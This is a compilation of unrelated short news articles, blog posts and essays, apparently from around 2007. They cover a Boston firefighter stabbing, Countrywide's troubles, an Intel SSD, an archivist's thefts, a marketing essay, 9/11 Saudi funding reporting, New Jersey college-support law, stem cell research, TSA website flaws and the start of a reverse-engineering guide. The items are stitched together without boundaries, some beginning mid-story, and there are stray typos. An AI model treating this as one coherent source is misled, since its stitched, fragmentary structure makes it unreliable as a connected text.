Ironically , the firefighter 's life was likely saved because he sought refuge from his alleged assailants at Engine 5 on Saratoga Street - the station house he 's assigned to .
" Fortunately , those firefighters were not out on a call , " said Boston Fire Department spokesman Steve MacDonald .
MacDonald said the firefighter had gone to Chivas Restaurant in Day Square to grab takeout when " six guys started exchanging words with him .
He indicated he was just there to get a sandwich and that he was a firefighter .
They pushed him . "
Hoping to avoid a confrontation , MacDonald said the firefighter got into his car and headed for his station for safety 's sake , but the pack followed him on foot .
It was shortly before 2:45 a.m .
" As soon as he got out of his car , six guys jumped him and started kicking and punching him , " MacDonald said .
" He felt two sharp pains in his chest and knew he had been stabbed . "
The firefighter summoned the help of fellow jakes by ringing the station doorbell and his alleged attackers fled .
MacDonald said his injuries do not appear to be life - threatening .
" He 's more upset about the fact that he 's going to miss several shifts , " MacDonald said .
Police found no suspects in the area , but urge anyone with information to call 1-800 - 494- TIPS .

SAN FRANCISCO ( MarketWatch ) -- Countrywide Financial Corp. said Tuesday that it's not filing for bankruptcy as speculation swirls about the mortgage lender needing billions of dollars in extra cash to survive .
Shares of Countrywide slumped 28 % to close at $ 5.47 , the lowest level in more than a decade .
" There is no substance to the rumor that Countrywide is planning to file for bankruptcy , " the company said in a statement emailed to MarketWatch .
Countrywide CFC , also said that it's not aware of any leading agencies that are considering downgrading the company 's ratings .
As the largest mortgage lender in the United States , Countrywide has been hit hard by the subprime - fueled credit crisis .
The company has stopped offering many types of more - profitable , riskier home loans and is focusing on selling mortgages that conform to the standards of government - sponsored enterprises like Fannie Mae FNM , +0.85 % and Freddie Mac FRE , - 0.64 % .
However , Fannie and Freddie have suffered big mortgage losses themselves in recent months .
" Countrywide is severely challenged and might falter if it does not receive an infusion of at least $ 4 billion within the next couple of weeks , " Egan -Jones Ratings Co. , a ratings agency , wrote in a note Tuesday .
" The GSEs likely curtailing purchases have hurt Countrywide . "
' Recreated ' documents
Countrywide shares were also pressured after the New York Times reported that the company falsified some documents .
A la1`wyer for Countrywide told a judge recently that the lender " recreated " three letters related to the bankruptcy case of a Pennsylvania homeowner , the newspaper reported , citing court records .

Intel launched its new Z - P140 PATA drive today as part of the company 's push to advance mobile Internet device technology .
The Z - P140 SSD ( solid state disk ) is impressive , with a total area smaller than a fingertip ( as pictured ) and available capacities of 2GB and 4GB .
At 0.6 grams , the Z - P140 is 75 x lighter than a standard 1.8 " drive , while occupying only 1/400 of the volume .
Intel claims that the Z - P140 class of drives can be expanded up to 16GB in future iterations .
It might be tiny , but Intel claims its new SDD is no slouch in the performance department .
The Z - P140 is rated at a 40 MBps read speed and 30 MBps write speed .
Power draw ( or lack thereof ) is also impressive ; the Z - P140 draws 300 mW under load and just 1.1 mW in sleep mode .
The current drive only supports the PATA ( Parallel ATA ) interface , but future models will be SATA compliant .
The Z - P140 is meant to supercede the USB - based Z - P130 , though it's not clear if the P140 will replace the P130 entirely at this point .
Intel 's decision to focus on this type of SSD design only makes sense when the company 's Menlow platform is considered as a whole .
Intel has been talking up Menlow ( and MIDs in general ) since it launched the concept back in April of this year .
Whereas the first - generation of UMPC / MID devices were based on a platform code - named McCaslin , and built around the Intel A100 / A110 , the 945GU Express chipset , and the ICH7U southbridge , Menlow will incorporate Intel 's new Silverthorne CPU and will run on the Poulsbo chipset .
Intel has n't published exact specifications on Paulsbo as of yet , but the chipset is expected to debut with support for 802.11n and WiMax .
Ars discussed Intel 's Silverthorne design last week , while our senior CPU editor , Jon Stokes shared some thoughts on how the x86 ISA might be expected to perform , in general , in the mobile segment back in September .
Intel 's new PATA SDD launch might seem unrelated to its activities in the CPU sector , but for a company dedicated to building platforms ( and that 's the business Intel is pushing these days ) , all of these products directly tie together .
Intel has previously stated that Menlow will draw far less power than previous UMPC / MID devices , and the company is obviously targeting all of its platform components to hit these targets without compromising on performance .
Update : I previously referred to Menlow as Merom ( another Intel mobile microarchitecture ) at two points within this story .
The error has been corrected .
Mr. Romito ’s index to the Calhoun volumes listed the letter as the property of the New York State Library .
He alerted the library , and was told that the matter was being looked into .
Image An 1823 letter by John C. Calhoun was offered on eBay and led to the discovery of a thieving archivist .
“ I did n’t know what was going to happen , ” Mr. Romito said .
So he bid on the item himself .
“ I knew I was n’t going to end up buying it  I was n’t going to pay for it  but I put in what I thought was a very high bid to try and keep it from going somewhere else .
The government can be slow . ”
Mr. Romito ’s discovery led quickly to a state investigation , and on Monday resulted in charges being filed against the would - be seller , Daniel D. Lorello .
Mr. Lorello , 54 , has worked at the New York State Archives in Albany for 29 years .
The state attorney general ’s office has charged him with several criminal counts , including grand larceny , criminal possession of stolen property , and scheming to defraud .
In a handwritten confession that the authorities obtained from Mr. Lorello on Thursday , he said he had been illegally selling rare books and documents from the state ’s collections since 2002 .
His thefts intensified last year , he wrote , “ because my daughter , Maria , unexpectedly ran up a $ 10,000 credit card bill . ”
“ I estimate that I ’ve taken more than 300 or 400 items in 2007 alone , ” Mr. Lorello wrote .
The attorney general ’s office said he sold them on eBay and at collectors ’ trade shows .
Robin L. Baker , a deputy attorney general , said at a news conference that investigators had discovered “ more than a dozen boxes of stolen items ” at Mr. Lorello ’s home in Rensselaer .
She said they were believed to form the majority of the stolen documents .
As a kid growing up among the vineyards and foothills of Cucamonga , I was haunted by the notion that everyone else knew things I would never be privy to .
Then I came across my first Playboy magazine ... and I was suddenly offered proof there was a party going on that I was n’t invited to .
This is a recurring topic when I talk with Gary Halbert .
We both were mesmerized by Hugh Hefner ’s lifestyle -- hanging out all day and night in your pajamas , surrounded by gorgeous young things who could n’t seem to keep their own peejays on .
How the hell , we wondered obsessively , do you go about getting invited to that party ?
In a very significant way , this frustration formed the paths our careers took .
For Gary , that path went through Hollywood and New York city and Miami Beach , buzzing around the ocean in tricked - out boats and staring down the maitre ’d at Toot Shor ’s , always with a pretty girl nearby .
For me , the path wound through the be-bop hinderlands of America ’s counter culture .
Dancin ’ in the moonlight , the sexual revolution , the occasional incoherent chat with God .
Heck , I think I once played poker with the Devil .
Bastard cheats .
Anyway ... there came a time when getting that invite to the Playboy mansion was within reach .
I sat in a cushy office on Sunset Blvd. , in a building where every elevator ride was shared with a different celebrity , and I was hanging with a guy who was so well - connected in Hollywood that he could get us a table at Spago ’s with an hour ’s notice .
While crowds of people who’d had reso ’s for six months languished in the waiting room .
And you know what ?
I did n’t want to go .
Well , okay , a part of me was still interested , if only for the bragging rights .
But a bigger part of me just did n’t give a damn anymore .
The “ party ” at Hef ’s place suddenly seemed more like a silly adult version of Disneyland than something vital and enticing .
So I never went .
After ten years in the wasteland of Los Angeles , I ’d reached an important realization :
The rich and the famous were most definitely NOT having a better time than I was .
In my entire life , there are n’t more than a handful of days I would n’t happily relive .
I was n’t aware of it most of the time ... but I was waking up every single morning to another chapter of a grand adventure .
It was a BIG DEAL to finally realize this .
And stop obsessing on the party I felt I was missing out on .
One of the biggest appeals in advertising is the promise of a different , better life .
A sudden , jolting change , where money worries vanish , sex is plentiful , and the world cowers at your feet .
Or some version of that .
And this appeal forever remains untainted by the dire warnings of those who will tell you that fame has its costs , money ca n’t solve emotional problems , and even wild orgies can grow tiresome very quickly .
All of which is true .
However ... it ’s important for marketers to understand that most people lead lives of quiet desperation .
They do n’t get to meet interesting people , or do interesting things , or go to interesting places .
They are bored shitless .
And convinced that life could be a bed of roses if only ... if only ... if only they could find a way to get invited to The Party .
I am not an evangelist on this matter .
I ’m not going to bang my head against the wall trying to get you to see the truth .
But I will share my observations , in the vain hope that at least a few people will catch the hint .
Here ’s what I ’m talking about : I do n’t know what brought you to your business .
But I ’m pretty sure you were n’t “ invited ” .
I was not invited into the ranks of copywriters .
The corporate world kept spitting me out , because I was such a bad fit in the tie - wearing , don’ tcolor - outside - the - lines , 9 - to - 5 culture .
I stumbled into the entrepreneurial field entirely as a result of not finding anywhere else to land .
I ’m glad it worked out this way , of course ... but it was a bumpy ride .
And one day , after decades of bouncing around the American dream , I suddenly realized how lucky I was .
I ’d somehow managed to chew through a wide swath of crucially - important adventures few people ever experienced .
And this is what I learned :
First ... the reason I believed , as a kid , that everyone else ( both adult and fellow child ) knew vital secrets I did n’t ... was because I had assumed their smug confidence and bravado had to be based on something real .
Now , I know the truth :
They were n’t thinking thoughts that I was n’t privy to .
Nope .
They were n’t thinking at all .
Most of the time , there was n’t a single thought in their heads .
They were coasting on vapor .
Second ... the only reason the party I was n’t invited to seemed so much better than the party I was at ... was simply a twisted version of the grass being greener on the other side .
As Halbert says , “ I know exactly what I do n’t want in life ... and it ’s always what I already have . ”
I ’ll spare you the gory details ... but the average weekend party we threw in college , for almost no money at all ... easily rivaled the best million - dollar fiesta
Hef has ever hosted for fun and wildness .
( I ’ve even met shrinks who insist the poor guy is actually depressed .
Possibly because there ’s no challenge left in his life . )
I ’ve hung with celebrities .
They are the most boring people on the planet .
( As Marlon Brando once noted , a movie star is someone who , if you ai n’t talking about them , they ai n’t listening . )
I ’ve hung with rich folks , and with nearpenniless desperados .
More often than not , money will make you fat and lazy and uninteresting .
It ’s no fun starving to death , either , but for many the risk of losing your essence increases with every buck you pack away .
And , I ’ve hung with corporate CEOs , big - time wheeler - dealers , and women so stunningly beautiful they take your breath away .
Scratch the surface of any of them , and you may back away in horror at what you find underneath .
Many of them see you as food , at best .
Many of the rest are nothing more than angry , frightened children in grown - up clothes and masks of make - up .
Lastly : Abe Lincoln was right -- most people are about as happy as they make up their mind to be .
I am blessed with a deep list of good friends and colleagues .
People who can lift my spirits in a two - minute chat .
People I rely on , and who rely on me and make my life full and robust .
And the one big realization I am so thankful of having ... is that these people have provided me with a life - long “ party ” more exciting and more satisfying than anything else going on , anywhere .
Because the key to a great party is a roomful of vital , interesting friends .
Not celebrity , not showy banquets , not tits and ass .
Life is already a grand adventure ... however , most people choose to pretend it is n’t .
And the punch - line is ... all you have to do is wake up to get back in the groove .
As a marketer , understanding the depth and urgency of raw need in your target population is critical .
This is where world - class sales pitches begin to foment .
It ’s the basic ingredient .
But more important ... if you truly desire success , you cannot run off thinking it ’s built on fame , money and power .
Because it is n’t .
Some of the richest people I ’ve met are also the most miserable .
No matter where they are , they ’re convinced the “ real ” party is across town .
And they were n’t invited .
When you ’re truly successful , you ’re the party .
If your life is n’t vibrant and stimulating right now , then changing that condition is a big part of your current job .
Remember -- most people do n’t get to do this .
They ’re stuck in normal jobs , numbed by television and caged by their own refusal to risk .
Or to read and learn and put a little effort into taking control .
And here you are , smack in the middle of the most exciting and urgent part of the business world .
Entrepreneurs rock .
You ’re part of the life - blood of the planet .
Other people wish they had your cojones .
When you ’ve got your biz cooking on all cylinders , you ’re the party everyone wants to get invited to .
So .
Are you having fun yet ?

10 Best Books Ever Written On The Subject Of Money
Watch the BBC Report / Read the Transcript
September 10 , 2006 – On November 9 , 2001 , when you could still choke on the dust in the air near Ground Zero , BBC Television received a call in London from a top - level US intelligence agent .
He was not happy .
Shortly after George W. Bush took office , he told us reluctantly , the CIA , the Defense Intelligence Agency ( DIA ) and the FBI , “ were told to back off the Saudis . ”
We knew that .
In the newsroom , we had a document already in hand , marked , “ SECRET ” across the top and – meaning this was a national security matter .
The secret memo released agents to hunt down two members of the bin Laden family operating a “ suspected terrorist organization ” in the USA .
It was dated September 13 , 2001 – two days too late for too many .
What the memo indicates , corroborated by other sources , was that the agents had long wanted to question these characters but could not until after the attack .
By that time , these bin Laden birds had flown their American nest .
Back to the high - level agent .
I pressed him to tell me exactly which investigations were spiked .
None of this interview dance was easy , requiring switching to untraceable phones .
Ultimately , the insider said , “ Khan Labs . ”
At the time , our intelligence agencies were on the trail of Pakistan ’s Dr. Strangelove , A.Q. Khan , who built Pakistan ’s bomb and was selling its secrets to the Libyans .
But once Bush and Condoleeza Rice ’s team took over , the source told us , agents were forced to let a hot trail go cold .
Specifically , there were limits on tracing the Saudi money behind this “ Islamic bomb . ”
Then we made another call , this time to an arms dealer in the Mideast .
He confirmed that his partner attended a meeting in 1995 at the 5 - star Hotel Royale Monceau in Paris where , allegedly , Saudi billionaires agreed to fund Al Qaeda fanatics .
We understood it to be protection money , not really a sign of support for their attacks .
Nevertheless , rule number one of investigation is “ follow the money ” – but the sheiks ’ piggy banks were effectively off - limits to the US agents during the Bush years .
One of the men in the posh hotel ’s meeting of vipers happens to have been a Bush family business associate .
Before you jump to the wrong conclusion , let me tell you that we found no evidence – none , zero , no kidding – that George Bush knew about Al Qaeda ’s plan to attack on September 11 .
Indeed , the grim joke at BBC is that anyone accusing George Bush of knowing anything at all must have solid evidence .
This is not a story of what George Bush knew but rather of his very - unfunny ignorance .
And it was not stupidity , but policy : no asking Saudis uncomfortable questions about their paying off roving packs of killers , especially when those Saudis are so generous to Bush family businesses .
Yes , Bill Clinton was also a bit too tender toward the oil men of Arabia .
But this you should know :
In his last year in office , Clinton sent two delegations to the Gulf to suggest that the Royal family crack down on “ charitable donations ” from their kingdom to the guys who blew up our embassies .
But when a failed Texas oil man took over the White House in January 2001 , demands on the Saudis to cut off terror funding simply stopped .
And what about the bin Laden “ suspected terrorist organization ” ?
Called the World Assembly of Muslim Youth , the group sponsors soccer teams and summer camps in Florida .
BBC obtained a video of one camp activity , a speech exhorting kids on the heroism of suicide bombings and hostage takings .
While WAMY draws membership with wholesome activities , it has also acted as a cover or front , say the Dutch , Indian and Bosnian governments , for the recruitment of jihadi killers .
Certainly , it was worth asking the bin Laden boys a few questions .
But the FBI agents could n’t , until it was too late .
In November 2001 , when BBC ran the report on the spike of investigations of Saudi funding of terror , the Bush defenders whom we ’d invited to respond on air dismissed the concerns of lower level FBI agents who ’d passed over the WAMY documents .
No action was taken on the group headed by the bin Ladens .
Then , in May this year , fifty FBI agents surrounded , invaded and sealed off WAMY ’s Virginia office .
It was like a bad scene out of the ‘ Untouchables . ’
The raid took place three years after our report and long after the bin Ladens had waved bye - bye .
It is not surprising that the feds seized mostly empty files and a lot of soccer balls .
Why now this belated move on the bin Laden ’s former operation ?
Why not right after the September 11 attack ?
This year ’s FBI raid occurred just days after an Islamist terror assault in Riyadh , Saudi Arabia .
Apparently , messin ’ with the oil sheiks gets this Administration ’s attention .
Falling towers in New York are only for Republican convention photo ops .
The 199 - I memo was passed to BBC television by the gumshoes at the National Security News Service in Washington .
We authenticated it , added in our own sleuthing , then gave the FBI its say , expecting the usual , “ It ’s baloney , a fake . ”
But we did n’t get the usual response .
Rather , FBI headquarters said , “ There are lots of things the intelligence community knows and other people ought not to know . ”
Ought not to know ?
What else ought we not to know , Mr. President ?
And when are we supposed to forget it ?

9/11 : The Missing Stories
Terror in Tiny Town
Secret US Plans for Iraqi Oil
Ground Zero as Profit Center
WASHINGTON , Oct. 23  Richard L. Thornburgh , attorney general in the Reagan and first Bush administrations , charged Tuesday that political reasons motivated the Justice Department to open corruption investigations against Democrats in Mr. Thornburgh ’s home state , Pennsylvania .
In testimony before the House Judiciary Committee , Mr. Thornburgh became the first former Republican attorney general to join with Democratic lawmakers to suggest that the Justice Department under Attorney General Alberto R. Gonzales had singled out Democratic politicians for prosecution .
“ The citizens of the United States must have confidence that the department is conducting itself in a fair and impartial manner without actual political influence or the appearance of political influence , ” said Mr. Thornburgh , who is now in private practice .
He is defending the former elected Democratic coroner of Allegheny County , Pa. , against federal corruption charges .
“ Unfortunately that may no longer be the case . ”
His unusually harsh criticism of fellow Republicans was directed specifically at the United States attorney in Pittsburgh , Mary Beth Buchanan , who was director of the Executive Office of United States Attorneys , based in Washington , in 2004 and 2005 .
That office has come under scrutiny for its role in the dismissal of United States attorneys last year , in some cases for what appear to have been partisan reasons .
New Jersey is among a minority of states that require divorced or separated parents to fund their children ’s higher education expenses .
Since the case of Nebel v. Nebel , 103 N.J. Super. 216 ( App. Div. 1968 ) , the New Jersey Courts have found that financially able parents must contribute to their children ’s college expenses .
In that case , the Court allowed the custodial mother to select a private college on behalf of her son , but determined the father ’s contribution based on tuition at state universities .
In Finger v. Zenn , 335 N.J. Super. 438 ( App. Div. 2000 ) the Court overturned Nebel in part , and held that the contribution of financially capable parents ought to be calculated on the tuition at the university in which the child is actually enrolled , whether public or private .
The Court , in Newburgh v. Arrigo , 88 N.J. 529 ( 1982 ) , delineated the specific criteria to be considered in determining whether parents are legally obligated to fund higher education expenses :
• Whether the parent , if still living with the child , would have contributed toward the costs of the requested higher education ;
• The effect of the background , values and goals of the parent on the reasonableness of the expectation of the child for higher education ;
• The amount of the contribution sought by the child for higher education ;
• The ability of the parent to pay that cost ;
• The relationship of the requested contribution to the kind of school or course of study sought by the child ; •
The financial resources of both parents ;
• The commitment to and aptitude of the child for the requested education ;
• The financial resources of the child , including assets owned individually or held in custodianship or trust ;
• The ability of the child to earn income during the school year or on vacation ;
• The availability of financial aid in the form of college grants and loans ;
• The child ’s relationship to the paying parent , including mutual affection and shared goals as well as responsiveness to parental advice and guidance ;
• The relationship of the education requested to any prior training and to the overall long - range goals of the child ; and
• Contribution made to household expenses by the current spouse of either parent [ Hudson v. Hudson , 315 N.J. Super. 577 ( App. Div. 1998 ) ] .
Generally , Courts will hold all financially able parents responsible for contributing to the college expenses of qualified students .
However , in instances where children have had no relationship with a parent , and the parent is not involved in the child ’s decision to attend college and where , Courts have held that parent not responsible for the child ’s higher education expenses .
For example , in Moss v. Nedas , 289 N.J. Super. 352 ( App. Div. 1996 ) , the Court refused to hold the father responsible for any portion of his daughter ’s college expenses after finding that she had excluded him from all of the decisions leading up to her enrollment .
The responsibility to contribute to higher education expenses may not end with the completion of a four - year college program .
In Ross v. Ross , 167 N.J. Super. 441 ( Ch. Div. 1979 ) , the Court required the father to continue child support payments for his daughter until she completed law school .
The responsibility also does not end with the death of a parent .
In Kiken v. Kiken , 149 N.J. 441 ( 1997 ) , the Court held the father ’s estate responsible for contributing to his son ’s undergraduate college expenses .

The Bush Administration appears to be on the verge of proposing a bailout in response to the subprime mortgage crisis :
Treasury Secretary Henry M. Paulson Jr. unveiled new details of the Bush administration ’s mortgage - relief plan yesterday , including a proposal that would grant new powers to local governments to refinance the mortgages of struggling homeowners .
Paulson spoke publicly for the first time on the strategy that would temporarily freeze interest rates for many troubled homeowners or help them refinance , a plan that is gaining momentum among federal regulators , leaders of the mortgage and housing industries , and lawmakers of both parties as the mortgage crisis worsens .
And the details of that plan , it seems , essentially would be to allow borrowers to re-write the terms of their loans and shift risk more decisively to lenders , who traditionally use things like higher interest rates to account for the fact that a given borrower is a high credit risk :
Many homeowners with subprime loans could apply to freeze their rates or refinance their loans quickly under the deal being worked out by Treasury officials and the Hope Now Alliance , a coalition of consumer counseling groups , investors , nonprofits , and lenders such as Citigroup , Wells Fargo and Countrywide Financial .
The major sticking point is the investors who buy securities made up of subprime loans .
For years , they provided the financial backing that allowed mortgage firms to expand their lending .
No type of loan made more money for investors , or was as risky , as subprime mortgages , because they required homeowners with shaky credit to pay more interest .
If lenders agree to freeze loans at lower rates , investors would lose out on the higher payments promised under the original loans , which could give them grounds to sue the lenders .
“ While the devil in the details , this is the first time the administration is devising a plan that meets the magnitude of the problem , ” said Sen .
Charles E. Schumer ( D - N.Y . ) .
“ If investors can be compelled to go along without long legal delay , it has the potential to make a real dent in the problem . ”
In other words , let ’s screw the investors .
I ’ve said it before , and I ’ll say it again — the only “ problem ” that exists in connection with the subprime mortgage crisis is the fact that it is the inevitable outcome of two bad ideas .
First , for nearly a decade we were living in a real estate bubble where housing values were rising at rates that were , to any rational person looking at the numbers , not sustainable .
Second , in part because of the housing bubble and in part because of simple bad decision making , people were buying houses they really could n’t afford and entering into loan transactions that were not in their best interest .
As a result , when the bubble popped and rates started rising , people started defaulting on their loans .
None of this should come as a surprise , and the rational response to all of this should be to let the situation play itself out .
Instead , everyone involved — Congress , the White House , Wall Street , the banks , and the real estate industry — wants to come up with a plan to delay the inevitable reckoning that we ’re already in .
And this is coming from a Republican President and a supposedly conservative Treasury Department .
I ’d like to say that I ’m surprised , but I ’m not .

It evokes a tragedy that marks an epoch .
From the outset , the warfare state has exploited " 9/11 , " a label at once too facile and too laden with historic weight -- giving further power to the tacit political axiom that perception is reality .
Often it seems that media coverage is all about perception , especially when the underlying agendas are wired into huge profits and geopolitical leverage .
If you associate a Big Mac or a Whopper with a happy meal or some other kind of great time , you 're more likely to buy it .
If you connect 9/11 with a need for taking military action and curtailing civil liberties , you 're more likely to buy what the purveyors of war and authoritarian government have been selling for the past half - dozen years .
" Sept. 11 changed everything " became a sudden cliche in news media .
Words are supposed to mean something , and those words were -- and are -- preposterous .
They speak of a USA enthralled with itself while reducing the rest of the world ( its oceans and valleys and mountains and peoples ) to little more than an extensive mirror to help us reflect on our centrality to the world .
In an individual , we call that narcissism .
In the nexus of media and politics , all too often , it 's called " patriotism . "
What happened on Sept. 11 , 2001 , was extraordinary and horrible by any measure .
And certainly a crime against humanity .
At the same time , it was a grisly addition to a history of human experience that has often included many thousands killed , en masse , by inhuman human choice .
It is simply and complexly a factual matter that the U.S. government has participated in outright mass murders directly -- in , for example , Vietnam , Laos , Cambodia , Panama , Yugoslavia , Afghanistan , Iraq -- and less directly , through aid to armies terrorizing civilians in Nicaragua , Angola , East Timor and many other countries .
The news media claim to be providing context .
But whose ?
Overall , the context of Uncle Sam in the more perverse and narcissistic aspects of his policy personality .
The hypocrisies of claims about moral precepts and universal principles go beyond the mere insistence that some others " do as we say , not as we do . "
What gets said , repeated and forgotten sets up kaleidoscope patterns that can be adjusted to serve the self - centered mega-institutions reliably fixated on maintaining their own dominance .
Media manifestations of these patterns are frequently a mess of contradictions so extreme that they can only be held together with the power of ownership , advertising and underwriting structures -- along with notable assists from government agencies that dispense regulatory favors and myriad pressure to serve what might today be called a military - industrial - media complex .
Our contact with the world is filtered through the mesh of mass media to such a great extent that the mesh itself becomes the fabric of power .
The most repetitious lessons of 9/11 -- received and propagated by the vast preponderance of U.S. news media -- have to do with the terribly asymmetrical importance of grief and of moral responsibility .
Our nation is so righteous that we are trained to ask for whom the bell tolls .
Rendered as implicitly divisible , humanity is fractionated as seen through red - white - and - blue windows on the world .
Posing outside cycles of violence and victims who victimize , the dominant vision of Pax Americana has no more use now than it did six years ago for W.H. Auden 's observation : " Those to whom evil is done / Do evil in return . "
We ought to know .
But we Americans are too smart for that .
The U.S. media tell us so .

WASHINGTON ( Reuters ) - A third team of researchers has found a way to convert an ordinary skin cell into valued embryonic - like stem cells , with the potential to grow batches of cells that can be directed to form any kind of tissue .
A scientific team from the University of Wisconsin - Madison created genetic modifications in skin cells , pictured here in this undated handout , to induce the cells into what scientists call a pluripotent state - a condition that is essentially the same as that of embryonic stem cells .
REUTERS / Junying Yu / University of Wisconsin- Madison / Handout
Their study , published on Sunday in the journal Nature , shows the approach is not a rare fluke but in fact something that might make its way into everyday use .
Scientists hope they are starting an age of regenerative medicine , in which people can get tailor - made treatments for injuries , diseases such as Parkinson ’s and diabetes , and in which scientists can study disease far better than before .
Dr. George Daley of Harvard Medical School and Children ’s Hospital Boston and colleagues got their skin cells from a volunteer , whereas the other two teams of researchers who have accomplished the feat got theirs from commercially available cells grown in labs -- a seemingly small difference , but one Daley says shows it is feasible to get cells from any volunteer .
“ Ours is the only group to go from skin biopsy to cell line , ” Daley said in a statement .
They said they are now working to generate the so - called induced pluripotent stem cell or iPS cells to match a variety of diseases .
Daley cautioned the approach is not ready to test in people .
The researchers use viruses called retroviruses to carry in four genes that transform the skin calls back into their primitive and malleable state .
And when injected into mice , the human iPS cells often formed tumors .
Daley ’s team is afraid this method might cause cancer or other unforeseen problems in human beings .
They also reprogrammed mesenchymal stem cells , a distinct adult stem cell type isolated from bone marrow that is the precursor of fat , bone and cartilage .
EMBRYONIC CELL WORK CONTINUES
Daley said his team would also continue to work with true embryonic stem cells , taken from days - old embryos .
While their use is controversial because it involves the destruction of the embryo , most stem cell experts say it is essential to continue to study them .
“ Understanding how to derive stem cells from embryos may teach us how to make the reprogramming process that much more efficient , ” Daley said .
It was by studying embryonic stem cells that researchers learned which genes are needed to make ordinary cells act in the same way .
Daley ’s lab used four genes and discovered that two were essential for turning back the clock and making the skin cells act like embryo cells , and two others helped them grow efficiently .
His team also converted fetal and embryonic cells into various cell types , and found these were far easier to work with .
“ The fact that embryonic and fetal cells convert more efficiently than adult cells was suggested in mouse studies but the pattern is quite apparent with human cells , ” Daley said .
“ This suggests that there are many aspects of the biology of reprogramming we still need to understand to make the process more efficient . ”
Just as modern French - speakers who travel to Quebec often find the dialect of French Canadians to be archaic and quaint , English - speakers who visit Washington , D.C. , are frequently bemused by the language spoken there .
Though the Potomac dialect shares the alphabet and grammar of English , it has a vocabulary all its own .
A few examples of Potomac phrases , followed by their English equivalents :
I have great respect for the senior senator .
I am about to drill my elderly colleague a new one .
We have full confidence in his integrity .
We will cut him loose by nightfall .
I do n’t pay attention to the polls .
My job - approval rating is 32 percent .
I had some gals come over to the condo to give me a massage .
I paid for sex .
When we have something to announce , we ’ll announce it .
We know the answer , but we ’re not going to tell you .
Frankly …
The following statement is false .
You are either with us or against us .
You are against us .
We identified weapons of mass destruction –related program activities .
We could not find any weapons of mass destruction .
I hope we can work together in a bipartisan way .
I need to pick off one senator from the other party to pass this bill .
The president has always said …
The president is announcing a new position .

sjbe sends in an old story with a poetic justice ending .
Almost a year ago Chris Soghoian blogged about multiple security holes exposing visitors to a TSA site to possible identity theft .
Wired and others picked up the story and the TSA took down the insecure site and fixed the problems .
On Friday the US House of Representatives Committee on Oversight and Government Reform released a report ( PDF HTML summary ) finding that the TSA contractor , Desyne Web Services , had received a no - bid contract for the faulty site from a former employee who was then a TSA project manager .
TSA has taken no action to sanction the responsible parties for the vulnerabilities .
The poetic justice is that Soghoian had been investigated for 6 months by the FBI and TSA because he pointed out a vulnerability in the US air transport system ; no charges were ever filed .

The ModBook is essentially an after - market hardware modification to standard off - the - shelf Apple® MacBook™ systems that has been transformed into tablet form .
As well as supporting direct on - screen drawing and handwriting recognition , the system enhances keyboard - less control through gesture recognition tailored to Mac applications with its pen-system ( which requires no batteries ) capable of 133 position updates per second .
The ModBook Digitizer Pen also features 2 programmable side buttons , an eraser and three different types of replaceable pen nibs ( Pencil , Studio and Felt ) that offer a variety of drawing styles and sensations .
The radio - based digitizer technology also enables users to write while their hand is resting on the screen and the pen can be used like a mouse to control the when hovering above the surface of the tablet .
The display screen itself features an anti-reflective coating on the inside for increased light transmission and image brightness and the outside is acid treated to achieve an etched surface to deliver sharp , paper - like writing .
The Modbook also retains the stylistic traits associated with Mac laptops .
Aircraft quality magnesium alloy used for both the top shell and the interior display frame and the top shell is plated with chrome over a set of copper and nickel layers for scratch - resistantance and protection against oxidation and is available in standard satin or optional mirror finish .
The wide viewing angle LCD panel ( Horiz . / Vert. : 100°/90° vs. 90°/55° ) and iSight camera are also given replaceable covers made from Axiotron 's chemically strengthened ForceGlass™ .
The LCD panel also retains the same resolution ( 1280x800 pixel ) and aspect ratio ( 113 ppi ) of the original MacBook™ display .
The Modbook is also the only portable Mac solution with built - in GPS functionality which is based on the SiRFstarTM III chipset .
The integrated CD / DVD combo drive that can be upgraded to a 8.5 GB DVD burner and other noteable features include built in 802.11 a /b/g/n capabilities , Bluetooth 2.0 and locking points designed into the magnesium top shell .
The Modbook is now on sale in the United States and Canada at an MRP of USD $ 2,290 .

In a study published today in the journal Stem Cells , scientists made embryonic clones of two men .
Not to be a cynical , but what 's the big deal ?
The procedure , in which researchers from stem cell company Stemagen removed nuclei from the skin cells of two adult men and put them inside a fertilized and emptied - out egg , is already known to scientists and the public .
It 's the first step of cloning – either therapeutic cloning , in which embryos provide stem cells for potential medical use , or reproductive cloning , in which embryos grow into a new person .
Both therapeutic and reproductive cloning are still in their early stages – the latter because it 's globally abhorred , the former because it 's scientifically tricky .
If scientists can figure out how to make viable embryonic stem cells from a clone , the human race would be a lot closer to personalized stem cell treatments , with new limbs and disease cures promised to anyone with a few spare skin flakes and enough money to foot the bill .
But this has n't yet been done .
Korean scientist Woo - Suk Hwang excited the world when he claimed to have pulled it off , but he was lying .
Though Stemagen said their cloned embryos could be used to make stem cells , they did n't actually try .
On the plus side , unlike earlier cloners , Stemagen made their clones with skin cells from an adult rather than embryonic stem cells or cells from ovaries .
If Stemagen 's clones do turn out to be a viable source for stem cells , the procedure will be relatively practical .
But that 's a frontier - sized " if " – and so long as it's unresolved , this study really does n't deserve the sort of wall - to - wall coverage it received today .
Indeed , science journalists seem to know this .
Witness the lead quote from the Associated Press story :
" I found it difficult to determine what was substantially new , " said
Doug Melton of the Harvard Stem Cell Institute .
He said the " next big advance will be to create a human embryonic stem cell line " from cloned embryos .
" This has yet to be achieved . "
Melton also told The Scientist that " it would be hard to call this a major advance . "
So why the coverage ?
Well , it 's a stem cell story and there 's cloning involved .
Those are hot words in any season , and especially lately , with advances in other stem cell techniques ( here and here ) whetting public appetite for news of potentially miraculous biotechnologies .
It 's also hard for journalists to tell their editor , " Everyone 's going to cover this , but it 's not a big deal . "
Neither does it help that scientists want to wash away the legacy of Woo - Suk Hwang , whose fraud jaded millions .
But over - reporting an advance that could still fall short makes another disillusionment more likely .
Update : Reuters headlined their story , " U.S. company claims cloned humans and made stem cells . "
The lead notes that Stemagen made its clones in the " eventual hope of making matched stem cells for patients , " but the writer – who almost certainly did n't pick the headline , and thus did n't realize she'd have to correct for a false assertion – never specifically says that stem cells were n't made .
* Update Two : Rick Weiss at the Washington Post looked at this in terms of stem cells rather than cloning ; from that perspective , he said , the study was significant , for it shows that few technical barriers remain to full human cloning .

How to crack a Binary File Format By Frans Important notice
Please do not send me binary files and expecting me to reverse engineer them for you for free .
Request for cracking passwords and other forms of encryption are deleted immediately by me .
At the moment , I am not available for any type of reverse engineering work .
Introduction
The most likely reason why people ask me for help is because I already have reversed engineerd some binary file formats .
So far , I have worked on :
A good reason why you want to crack the format at all .
A lot of time .
A lot of preseverence .
A lot of creativity .
Willingness to do repeative tasks for hours and hours .
